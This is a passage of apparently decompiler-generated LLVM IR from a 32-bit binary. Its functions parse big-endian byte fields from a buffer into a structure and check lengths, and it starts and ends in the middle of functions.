  %v0_1000ca44 = phi i32 [ %v2_1000c9ec, %dec_label_pc_1000c9cc ], [ -1, %dec_label_pc_1000ca08 ], [ %v0_1000ca44.pre, %dec_label_pc_1000ca10 ]
  ret i32 %v0_1000ca44

; uselistorder directives
  uselistorder i32 %v2_1000c9ec, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000ca34, { 2, 1, 0 }
}

define i32 @function_1000ca48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000ca48:
  store i32 268487256, i32* @lr, align 4
  %v0_1000ca54 = call i32 @function_1000d2dc()
  %v1_1000ca58 = icmp slt i32 %v0_1000ca54, 0
  br i1 %v1_1000ca58, label %dec_label_pc_1000ca64, label %dec_label_pc_1000ca60

dec_label_pc_1000ca60:                            ; preds = %dec_label_pc_1000ca48
  %v1_1000ca60 = add i32 %v0_1000ca54, 4
  br label %dec_label_pc_1000ca64

dec_label_pc_1000ca64:                            ; preds = %dec_label_pc_1000ca48, %dec_label_pc_1000ca60
  %v0_1000ca70 = phi i32 [ %v0_1000ca54, %dec_label_pc_1000ca48 ], [ %v1_1000ca60, %dec_label_pc_1000ca60 ]
  ret i32 %v0_1000ca70

; uselistorder directives
  uselistorder label %dec_label_pc_1000ca64, { 1, 0 }
}

define i32 @function_1000ca74(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_1000ca74:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_1000ca78 = load i32, i32* @lr, align 4
  store i32 %v0_1000ca78, i32* %r0.global-to-local, align 4
  %v2_1000ca80 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_1000ca80, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %v2_1000ca80, i32* %r5.global-to-local, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268487332, i32* @lr, align 4
  %v2_1000caa0 = call i32 @function_1000d1e8(i32 %v2_1000ca80, i32 256)
  store i32 %v2_1000caa0, i32* @r27, align 4
  %v1_1000caa4 = icmp slt i32 %v2_1000caa0, 0
  %v0_1000caa8 = load i32, i32* @r28, align 4
  %v2_1000caa8 = add i32 %v0_1000caa8, %v2_1000caa0
  store i32 %v2_1000caa8, i32* @r28, align 4
  %v1_1000caac = load i32, i32* @r29, align 4
  %v2_1000caac = sub i32 %v1_1000caac, %v2_1000caa8
  %v1_1000cab0 = add i32 %v2_1000caac, -10
  br i1 %v1_1000caa4, label %dec_label_pc_1000cb6c, label %dec_label_pc_1000cabc

dec_label_pc_1000cabc:                            ; preds = %dec_label_pc_1000ca74
  %v0_1000cac0 = load i32, i32* @r26, align 4
  %v2_1000cac0 = add i32 %v0_1000cac0, %v2_1000caa8
  store i32 %v2_1000cac0, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_1000cab0, -1
  br i1 %tmp6, label %dec_label_pc_1000cad0, label %dec_label_pc_1000cac8

dec_label_pc_1000cac8:                            ; preds = %dec_label_pc_1000cabc
  store i32 %v1_1000cab0, i32* @r27, align 4
  br label %dec_label_pc_1000cb6c

dec_label_pc_1000cad0:                            ; preds = %dec_label_pc_1000cabc
  store i32 268487380, i32* @lr, align 4
  %v1_1000cad0 = call i32 @function_1000775c(i32 %v2_1000ca80)
  %v0_1000cad4 = load i32, i32* @r30, align 4
  %v1_1000cad4 = add i32 %v0_1000cad4, 2
  store i32 %v1_1000cad4, i32* %r8.global-to-local, align 4
  %v1_1000cad8 = load i32, i32* @r31, align 4
  %v2_1000cad8 = inttoptr i32 %v1_1000cad8 to i32*
  store i32 %v1_1000cad0, i32* %v2_1000cad8, align 4
  %v0_1000cadc = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cadc = add i32 %v0_1000cadc, 2
  store i32 %v1_1000cadc, i32* %r10.global-to-local, align 4
  %v0_1000cae0 = load i32, i32* @r30, align 4
  %v1_1000cae0 = add i32 %v0_1000cae0, 10
  store i32 %v1_1000cae0, i32* %r5.global-to-local, align 4
  %v0_1000cae4 = load i32, i32* @r28, align 4
  %v1_1000cae4 = add i32 %v0_1000cae4, 10
  store i32 %v1_1000cae4, i32* %r6.global-to-local, align 4
  %v0_1000cae8 = load i32, i32* @r26, align 4
  %v2_1000cae8 = add i32 %v0_1000cae8, %v0_1000cae4
  %v3_1000cae8 = inttoptr i32 %v2_1000cae8 to i8*
  %v4_1000cae8 = load i8, i8* %v3_1000cae8, align 1
  %v5_1000cae8 = zext i8 %v4_1000cae8 to i32
  store i32 %v5_1000cae8, i32* %r0.global-to-local, align 4
  %v1_1000caec = add i32 %v0_1000cae0, 1
  %v2_1000caec = inttoptr i32 %v1_1000caec to i8*
  %v3_1000caec = load i8, i8* %v2_1000caec, align 1
  %v4_1000caec = zext i8 %v3_1000caec to i32
  store i32 %v4_1000caec, i32* %r9.global-to-local, align 4
  %v1_1000caf0 = mul nuw nsw i32 %v5_1000cae8, 256
  %v2_1000caf4 = or i32 %v4_1000caec, %v1_1000caf0
  store i32 %v2_1000caf4, i32* %r0.global-to-local, align 4
  %v1_1000caf8 = load i32, i32* @r31, align 4
  %v2_1000caf8 = add i32 %v1_1000caf8, 4
  %v3_1000caf8 = inttoptr i32 %v2_1000caf8 to i32*
  store i32 %v2_1000caf4, i32* %v3_1000caf8, align 4
  %v0_1000cafc = load i32, i32* @r30, align 4
  %v1_1000cafc = add i32 %v0_1000cafc, 2
  %v2_1000cafc = inttoptr i32 %v1_1000cafc to i8*
  %v3_1000cafc = load i8, i8* %v2_1000cafc, align 1
  %v4_1000cafc = zext i8 %v3_1000cafc to i32
  store i32 %v4_1000cafc, i32* %r0.global-to-local, align 4
  %v0_1000cb00 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cb00 = add i32 %v0_1000cb00, 1
  %v2_1000cb00 = inttoptr i32 %v1_1000cb00 to i8*
  %v3_1000cb00 = load i8, i8* %v2_1000cb00, align 1
  %v4_1000cb00 = zext i8 %v3_1000cb00 to i32
  store i32 %v4_1000cb00, i32* %r9.global-to-local, align 4
  %v1_1000cb04 = mul nuw nsw i32 %v4_1000cafc, 256
  %v2_1000cb08 = or i32 %v4_1000cb00, %v1_1000cb04
  store i32 %v2_1000cb08, i32* %r0.global-to-local, align 4
  %v1_1000cb0c = load i32, i32* @r31, align 4
  %v2_1000cb0c = add i32 %v1_1000cb0c, 8
  %v3_1000cb0c = inttoptr i32 %v2_1000cb0c to i32*
  store i32 %v2_1000cb08, i32* %v3_1000cb0c, align 4
  %v0_1000cb10 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cb10 = add i32 %v0_1000cb10, 2
  %v2_1000cb10 = inttoptr i32 %v1_1000cb10 to i8*
  %v3_1000cb10 = load i8, i8* %v2_1000cb10, align 1
  %v4_1000cb10 = zext i8 %v3_1000cb10 to i32
  store i32 %v4_1000cb10, i32* %r0.global-to-local, align 4
  %v0_1000cb14 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000cb14 = add i32 %v0_1000cb14, 1
  %v2_1000cb14 = inttoptr i32 %v1_1000cb14 to i8*
  %v3_1000cb14 = load i8, i8* %v2_1000cb14, align 1
  %v4_1000cb14 = zext i8 %v3_1000cb14 to i32
  %v1_1000cb18 = add i32 %v0_1000cb14, 3
  %v2_1000cb18 = inttoptr i32 %v1_1000cb18 to i8*
  %v3_1000cb18 = load i8, i8* %v2_1000cb18, align 1
  %v4_1000cb18 = zext i8 %v3_1000cb18 to i32
  %v1_1000cb1c = add i32 %v0_1000cb14, 2
  %v2_1000cb1c = inttoptr i32 %v1_1000cb1c to i8*
  %v3_1000cb1c = load i8, i8* %v2_1000cb1c, align 1
  %v4_1000cb1c = zext i8 %v3_1000cb1c to i32
  %v1_1000cb20 = mul nuw i32 %v4_1000cb10, 16777216
  %v1_1000cb24 = mul nuw nsw i32 %v4_1000cb14, 65536
  %v2_1000cb28 = or i32 %v1_1000cb24, %v1_1000cb20
  %v2_1000cb2c = or i32 %v2_1000cb28, %v4_1000cb18
  store i32 %v2_1000cb2c, i32* %r0.global-to-local, align 4
  %v1_1000cb30 = mul nuw nsw i32 %v4_1000cb1c, 256
  %v2_1000cb34 = or i32 %v1_1000cb30, %v2_1000cb2c
  store i32 %v2_1000cb34, i32* %r9.global-to-local, align 4
  %v1_1000cb38 = load i32, i32* @r31, align 4
  %v2_1000cb38 = add i32 %v1_1000cb38, 12
  %v3_1000cb38 = inttoptr i32 %v2_1000cb38 to i32*
  store i32 %v2_1000cb34, i32* %v3_1000cb38, align 4
  %v0_1000cb3c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cb3c = add i32 %v0_1000cb3c, 6
  %v2_1000cb3c = inttoptr i32 %v1_1000cb3c to i8*
  %v3_1000cb3c = load i8, i8* %v2_1000cb3c, align 1
  %v4_1000cb3c = zext i8 %v3_1000cb3c to i32
  store i32 %v4_1000cb3c, i32* %r9.global-to-local, align 4
  %v0_1000cb40 = load i32, i32* @r30, align 4
  %v1_1000cb40 = add i32 %v0_1000cb40, 9
  %v2_1000cb40 = inttoptr i32 %v1_1000cb40 to i8*
  %v3_1000cb40 = load i8, i8* %v2_1000cb40, align 1
  %v4_1000cb40 = zext i8 %v3_1000cb40 to i32
  store i32 %v4_1000cb40, i32* %r0.global-to-local, align 4
  %v0_1000cb44 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000cb44 = load i32, i32* @r31, align 4
  %v2_1000cb44 = add i32 %v1_1000cb44, 24
  %v3_1000cb44 = inttoptr i32 %v2_1000cb44 to i32*
  store i32 %v0_1000cb44, i32* %v3_1000cb44, align 4
  %v0_1000cb48 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cb48 = mul i32 %v0_1000cb48, 256
  store i32 %v1_1000cb48, i32* %r9.global-to-local, align 4
  %v0_1000cb4c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000cb4c = load i32, i32* @r31, align 4
  %v2_1000cb4c = add i32 %v1_1000cb4c, 20
  %v3_1000cb4c = inttoptr i32 %v2_1000cb4c to i32*
  store i32 %v0_1000cb4c, i32* %v3_1000cb4c, align 4
  %v0_1000cb50 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cb50 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000cb50 = or i32 %v1_1000cb50, %v0_1000cb50
  store i32 %v2_1000cb50, i32* %r9.global-to-local, align 4
  %v0_1000cb54 = load i32, i32* @r29, align 4
  %v2_1000cb54 = icmp slt i32 %v0_1000cb54, %v2_1000cb50
  %v1_1000cb58 = add i32 %v2_1000cb50, 10
  store i32 %v1_1000cb58, i32* %r0.global-to-local, align 4
  %v0_1000cb5c = load i32, i32* @r27, align 4
  %v2_1000cb5c = add i32 %v0_1000cb5c, %v1_1000cb58
  store i32 %v2_1000cb5c, i32* @r27, align 4
  %v1_1000cb60 = load i32, i32* @r31, align 4
  %v2_1000cb60 = add i32 %v1_1000cb60, 16
  %v3_1000cb60 = inttoptr i32 %v2_1000cb60 to i32*
  store i32 %v2_1000cb50, i32* %v3_1000cb60, align 4
  br i1 %v2_1000cb54, label %dec_label_pc_1000cb68, label %dec_label_pc_1000cad0.dec_label_pc_1000cb6c_crit_edge

dec_label_pc_1000cad0.dec_label_pc_1000cb6c_crit_edge: ; preds = %dec_label_pc_1000cad0
  %v0_1000cb70.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000cb6c

dec_label_pc_1000cb68:                            ; preds = %dec_label_pc_1000cad0
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000cb6c

dec_label_pc_1000cb6c:                            ; preds = %dec_label_pc_1000cad0.dec_label_pc_1000cb6c_crit_edge, %dec_label_pc_1000ca74, %dec_label_pc_1000cac8, %dec_label_pc_1000cb68
  %v0_1000cb70 = phi i32 [ %v0_1000cb70.pre, %dec_label_pc_1000cad0.dec_label_pc_1000cb6c_crit_edge ], [ %v2_1000caa0, %dec_label_pc_1000ca74 ], [ %v1_1000cab0, %dec_label_pc_1000cac8 ], [ -1, %dec_label_pc_1000cb68 ]
  store i32 %v0_1000ca78, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000cb70

; uselistorder directives
  uselistorder i32 %v2_1000cb50, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000cab0, { 1, 2, 0 }
  uselistorder i32 %v2_1000caa0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000ca80, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 20, { 16, 17, 18, 19, 1, 23, 20, 21, 24, 25, 26, 27, 10, 11, 13, 12, 0, 37, 38, 28, 29, 30, 31, 32, 34, 35, 33, 36, 22, 4, 14, 5, 3, 2, 6, 15, 7, 8, 9 }
  uselistorder i32 9, { 11, 12, 13, 14, 2, 0, 15, 3, 16, 4, 17, 18, 19, 20, 5, 21, 22, 1, 6, 7, 8, 9, 10 }
  uselistorder i32 (i32)* @function_1000775c, { 2, 1, 0, 3 }
  uselistorder i32 -10, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000cb6c, { 3, 0, 2, 1 }
}

define i32 @function_1000cb84() local_unnamed_addr {
dec_label_pc_1000cb84:
  %v0_1000cb88 = load i32, i32* @lr, align 4
  store i32 268487596, i32* @lr, align 4
  %v3_1000cba8 = call i32 @function_10004f90(i32 ptrtoint ([11 x i8]* @global_var_1000f920.352 to i32), i32 ptrtoint (i32* @global_var_1000f8bc.322 to i32))
  %v3_1000cbb0 = icmp eq i32 %v3_1000cba8, 0
  br i1 %v3_1000cbb0, label %dec_label_pc_1000cbb8, label %dec_label_pc_1000cbd4

dec_label_pc_1000cbb8:                            ; preds = %dec_label_pc_1000cb84
  %v0_1000cbac = load i32, i32* @r29, align 4
  store i32 %v0_1000cb88, i32* @lr, align 4
  %v3_1000cbd0 = call i32 @function_10004f90(i32 ptrtoint ([18 x i8]* @global_var_1000f92c.353 to i32), i32 %v0_1000cbac)
  br label %dec_label_pc_1000cbd4

dec_label_pc_1000cbd4:                            ; preds = %dec_label_pc_1000cb84, %dec_label_pc_1000cbb8
  %v0_1000cbe4 = phi i32 [ %v3_1000cba8, %dec_label_pc_1000cb84 ], [ %v3_1000cbd0, %dec_label_pc_1000cbb8 ]
  ret i32 %v0_1000cbe4

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10004f90, { 8, 4, 3, 2, 7, 6, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000cbd4, { 1, 0 }
}

define i32 @function_1000cbe8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1000cbe8:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_1000cbec = load i32, i32* @lr, align 4
  %v1_1000cbf4 = sub i32 0, %arg6
  %v1_1000cbf8 = urem i32 %v1_1000cbf4, 4
  store i32 %v1_1000cbf8, i32* %r0.global-to-local, align 4
  %v3_1000cbf8 = icmp eq i32 %v1_1000cbf8, 0
  store i32 %arg6, i32* @r30, align 4
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_1000cc18 = load i32, i32* @r10, align 4
  store i32 %v0_1000cc18, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_1000cc34.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_1000cbf8, label %dec_label_pc_1000cc34, label %dec_label_pc_1000cc24

dec_label_pc_1000cc24:                            ; preds = %dec_label_pc_1000cbe8
  %v2_1000cc24 = icmp ult i32 %v0_1000cc34.pr, %v1_1000cbf8
  br i1 %v2_1000cc24, label %dec_label_pc_1000cee8, label %dec_label_pc_1000cc2c

dec_label_pc_1000cc2c:                            ; preds = %dec_label_pc_1000cc24
  %v2_1000cc2c = sub i32 %v0_1000cc34.pr, %v1_1000cbf8
  store i32 %v2_1000cc2c, i32* %r9.global-to-local, align 4
  %v2_1000cc30 = add i32 %v1_1000cbf8, %arg6
  store i32 %v2_1000cc30, i32* @r30, align 4
  br label %dec_label_pc_1000cc34

dec_label_pc_1000cc34:                            ; preds = %dec_label_pc_1000cbe8, %dec_label_pc_1000cc2c
  %v0_1000cc40 = phi i32 [ %v2_1000cc30, %dec_label_pc_1000cc2c ], [ %arg6, %dec_label_pc_1000cbe8 ]
  %v0_1000cc44 = phi i32 [ %v2_1000cc2c, %dec_label_pc_1000cc2c ], [ %v0_1000cc34.pr, %dec_label_pc_1000cbe8 ]
  %tmp49 = icmp ult i32 %v0_1000cc44, 32
  br i1 %tmp49, label %dec_label_pc_1000cee8, label %dec_label_pc_1000cc3c

dec_label_pc_1000cc3c:                            ; preds = %dec_label_pc_1000cc34
  %v3_1000cc3c = icmp eq i32 %arg4, 1
  %v1_1000cc40 = add i32 %v0_1000cc40, 32
  store i32 %v1_1000cc40, i32* @r24, align 4
  %v1_1000cc44 = add i32 %v0_1000cc44, -32
  store i32 %v1_1000cc44, i32* @r27, align 4
  br i1 %v3_1000cc3c, label %dec_label_pc_1000cd44, label %dec_label_pc_1000cc4c

dec_label_pc_1000cc4c:                            ; preds = %dec_label_pc_1000cc3c
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000cc54 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_1000cc54, align 4
  %tmp50 = icmp ult i32 %v1_1000cc44, 4
  br i1 %tmp50, label %dec_label_pc_1000cee8, label %dec_label_pc_1000cc5c

dec_label_pc_1000cc5c:                            ; preds = %dec_label_pc_1000cc4c
  %v0_1000cc5c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cc5c = add i32 %v0_1000cc5c, -36
  store i32 %v1_1000cc5c, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_1000cc5c, 8
  br i1 %tmp51, label %dec_label_pc_1000cee8, label %dec_label_pc_1000cc68

dec_label_pc_1000cc68:                            ; preds = %dec_label_pc_1000cc5c
  %v0_1000cc68 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_1000cc68, 16
  br i1 %tmp52, label %dec_label_pc_1000cee8, label %dec_label_pc_1000cc70

dec_label_pc_1000cc70:                            ; preds = %dec_label_pc_1000cc68
  %v1_1000cc70 = add i32 %v0_1000cc5c, -48
  store i32 %v1_1000cc70, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_1000cc70, 8
  br i1 %tmp53, label %dec_label_pc_1000cee8, label %dec_label_pc_1000cc7c

dec_label_pc_1000cc7c:                            ; preds = %dec_label_pc_1000cc70
  %v1_1000cc7c = add i32 %v0_1000cc5c, -56
  store i32 %v1_1000cc7c, i32* %r0.global-to-local, align 4
  %v1_1000cc80 = add i32 %v0_1000cc5c, -44
  store i32 %v1_1000cc80, i32* @r27, align 4
  %v3_1000cc84 = icmp ugt i32 %v1_1000cc7c, %v1_1000cc80
  %v0_1000cc88 = load i32, i32* @r30, align 4
  %v1_1000cc88 = add i32 %v0_1000cc88, 36
  store i32 %v1_1000cc88, i32* @r29, align 4
  %v1_1000cc8c = add i32 %v0_1000cc88, 48
  store i32 %v1_1000cc8c, i32* @r26, align 4
  br i1 %v3_1000cc84, label %dec_label_pc_1000cca0, label %dec_label_pc_1000cc98

dec_label_pc_1000cc98:                            ; preds = %dec_label_pc_1000cc7c
  store i32 %v1_1000cc7c, i32* @r27, align 4
  br label %dec_label_pc_1000cca0

dec_label_pc_1000cca0:                            ; preds = %dec_label_pc_1000cc7c, %dec_label_pc_1000cc98
  %v0_1000cca0 = phi i32 [ %v1_1000cc7c, %dec_label_pc_1000cc98 ], [ %v1_1000cc80, %dec_label_pc_1000cc7c ]
  %tmp54 = icmp ult i32 %v0_1000cca0, 80
  br i1 %tmp54, label %dec_label_pc_1000cee8, label %dec_label_pc_1000cca8

dec_label_pc_1000cca8:                            ; preds = %dec_label_pc_1000cca0
  store i32 268487852, i32* @lr, align 4
  %v0_1000cca8 = call i32 @function_1000cb84()
  store i32 %v0_1000cca8, i32* @r20, align 4
  %v3_1000ccac = icmp eq i32 %v0_1000cca8, 0
  br i1 %v3_1000ccac, label %dec_label_pc_1000cccc, label %dec_label_pc_1000ccb4

dec_label_pc_1000ccb4:                            ; preds = %dec_label_pc_1000cca8
  %v0_1000ccb4 = load i32, i32* @r24, align 4
  store i32 %v0_1000ccb4, i32* @r25, align 4
  %v0_1000ccbc = load i32, i32* @r26, align 4
  store i32 %v0_1000ccbc, i32* @r23, align 4
  %v0_1000ccc0 = load i32, i32* @r31, align 4
  store i32 %v0_1000ccc0, i32* @r24, align 4
  store i32 %v0_1000ccb4, i32* %r21.global-to-local, align 4
  %v1_1000cd5c.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000cd54

dec_label_pc_1000cccc:                            ; preds = %dec_label_pc_1000cca8
  %v1_1000cccc = load i32, i32* %r17.global-to-local, align 4
  %v2_1000cccc = inttoptr i32 %v1_1000cccc to i32*
  store i32 0, i32* %v2_1000cccc, align 4
  %v0_1000ccd0 = call i32 @function_10004e38()
  %v1_1000ccd4 = inttoptr i32 %v0_1000ccd0 to i32*
  %v2_1000ccd4 = load i32, i32* %v1_1000ccd4, align 4
  store i32 %v2_1000ccd4, i32* @r26, align 4
  br label %dec_label_pc_1000ceec

dec_label_pc_1000ccdc:                            ; preds = %dec_label_pc_1000ce7c
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000cce0 = load i32, i32* @r25, align 4
  %v1_1000cce0 = load i32, i32* @r22, align 4
  %v2_1000cce0 = inttoptr i32 %v1_1000cce0 to i32*
  store i32 %v0_1000cce0, i32* %v2_1000cce0, align 4
  %v0_1000cce4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cce4 = load i32, i32* @r22, align 4
  %v2_1000cce4 = add i32 %v1_1000cce4, 4
  %v3_1000cce4 = inttoptr i32 %v2_1000cce4 to i32*
  store i32 %v0_1000cce4, i32* %v3_1000cce4, align 4
  %v0_1000cce8 = load i32, i32* @r30, align 4
  %v1_1000cce8 = add i32 %v0_1000cce8, 8
  store i32 %v1_1000cce8, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000ccf0 = add i32 %v0_1000cce8, 4
  %v2_1000ccf0 = inttoptr i32 %v1_1000ccf0 to i32*
  %v3_1000ccf0 = load i32, i32* %v2_1000ccf0, align 4
  store i32 %v3_1000ccf0, i32* %r0.global-to-local, align 4
  %v0_1000ccf4 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000ccf4 = load i32, i32* @r28, align 4
  %v2_1000ccf4 = add i32 %v1_1000ccf4, 8
  %v3_1000ccf4 = inttoptr i32 %v2_1000ccf4 to i32*
  store i32 %v0_1000ccf4, i32* %v3_1000ccf4, align 4
  %v0_1000ccf8 = load i32, i32* @r22, align 4
  %v1_1000ccf8 = load i32, i32* @r28, align 4
  %v2_1000ccf8 = add i32 %v1_1000ccf8, 16
  %v3_1000ccf8 = inttoptr i32 %v2_1000ccf8 to i32*
  store i32 %v0_1000ccf8, i32* %v3_1000ccf8, align 4
  %v0_1000ccfc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ccfc = load i32, i32* @r28, align 4
  %v2_1000ccfc = inttoptr i32 %v1_1000ccfc to i32*
  store i32 %v0_1000ccfc, i32* %v2_1000ccfc, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000cd04 = load i32, i32* @r28, align 4
  %v2_1000cd04 = add i32 %v1_1000cd04, 12
  %v3_1000cd04 = inttoptr i32 %v2_1000cd04 to i32*
  store i32 4, i32* %v3_1000cd04, align 4
  br label %dec_label_pc_1000cd38

dec_label_pc_1000cd0c:                            ; preds = %dec_label_pc_1000cea0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000cd10 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000cd10 = load i32, i32* @r23, align 4
  %v2_1000cd10 = inttoptr i32 %v1_1000cd10 to i32*
  store i32 %v0_1000cd10, i32* %v2_1000cd10, align 4
  %v0_1000cd14 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cd14 = load i32, i32* @r23, align 4
  %v2_1000cd14 = add i32 %v1_1000cd14, 4
  %v3_1000cd14 = inttoptr i32 %v2_1000cd14 to i32*
  store i32 %v0_1000cd14, i32* %v3_1000cd14, align 4
  %v0_1000cd18 = load i32, i32* @r30, align 4
  %v1_1000cd18 = add i32 %v0_1000cd18, 8
  store i32 %v1_1000cd18, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000cd20 = add i32 %v0_1000cd18, 4
  %v2_1000cd20 = inttoptr i32 %v1_1000cd20 to i32*
  %v3_1000cd20 = load i32, i32* %v2_1000cd20, align 4
  store i32 %v3_1000cd20, i32* %r0.global-to-local, align 4
  %v0_1000cd24 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000cd24 = load i32, i32* @r28, align 4
  %v2_1000cd24 = add i32 %v1_1000cd24, 8
  %v3_1000cd24 = inttoptr i32 %v2_1000cd24 to i32*
  store i32 %v0_1000cd24, i32* %v3_1000cd24, align 4
  %v0_1000cd28 = load i32, i32* @r23, align 4
  %v1_1000cd28 = load i32, i32* @r28, align 4
  %v2_1000cd28 = add i32 %v1_1000cd28, 16
  %v3_1000cd28 = inttoptr i32 %v2_1000cd28 to i32*
  store i32 %v0_1000cd28, i32* %v3_1000cd28, align 4
  %v0_1000cd2c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cd2c = load i32, i32* @r28, align 4
  %v2_1000cd2c = inttoptr i32 %v1_1000cd2c to i32*
  store i32 %v0_1000cd2c, i32* %v2_1000cd2c, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1000cd34 = load i32, i32* @r28, align 4
  %v2_1000cd34 = add i32 %v1_1000cd34, 12
  %v3_1000cd34 = inttoptr i32 %v2_1000cd34 to i32*
  store i32 16, i32* %v3_1000cd34, align 4
  br label %dec_label_pc_1000cd38

dec_label_pc_1000cd38:                            ; preds = %dec_label_pc_1000ccdc, %dec_label_pc_1000cd0c
  %v0_1000cd38 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cd38 = load i32, i32* @r28, align 4
  %v2_1000cd38 = add i32 %v1_1000cd38, 4
  %v3_1000cd38 = inttoptr i32 %v2_1000cd38 to i32*
  store i32 %v0_1000cd38, i32* %v3_1000cd38, align 4
  %v0_1000cd3c = load i32, i32* @r28, align 4
  %v1_1000cd3c = load i32, i32* %r17.global-to-local, align 4
  %v2_1000cd3c = inttoptr i32 %v1_1000cd3c to i32*
  store i32 %v0_1000cd3c, i32* %v2_1000cd3c, align 4
  br label %dec_label_pc_1000ced4

dec_label_pc_1000cd44:                            ; preds = %dec_label_pc_1000cc3c
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_1000cd54

dec_label_pc_1000cd54:                            ; preds = %dec_label_pc_1000ccb4, %dec_label_pc_1000cd44
  %v1_1000cd5c = phi i32 [ %v1_1000cd5c.pre, %dec_label_pc_1000ccb4 ], [ %arg8, %dec_label_pc_1000cd44 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_1000cd5c = inttoptr i32 %v1_1000cd5c to i32*
  store i32 1, i32* %v2_1000cd5c, align 4
  br label %dec_label_pc_1000cebc

dec_label_pc_1000cd64:                            ; preds = %dec_label_pc_1000cebc
  %v0_1000cd64 = load i32, i32* @r24, align 4
  store i32 %v0_1000cd64, i32* @r3, align 4
  store i32 268488048, i32* @lr, align 4
  %v2_1000cd6c = call i32 @function_1000d01c(i32 %v0_1000cd64, i32 35)
  %v4_1000cd70 = icmp eq i32 %v2_1000cd6c, 0
  br i1 %v4_1000cd70, label %dec_label_pc_1000cd80, label %dec_label_pc_1000cd78

dec_label_pc_1000cd78:                            ; preds = %dec_label_pc_1000cd64
  %v3_1000cd6c = inttoptr i32 %v2_1000cd6c to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_1000cd6c, align 1
  br label %dec_label_pc_1000cd80

dec_label_pc_1000cd80:                            ; preds = %dec_label_pc_1000cd64, %dec_label_pc_1000cd78
  %v0_1000cd80 = load i32, i32* @r24, align 4
  store i32 %v0_1000cd80, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1000cdfc17 = inttoptr i32 %v0_1000cd80 to i8*
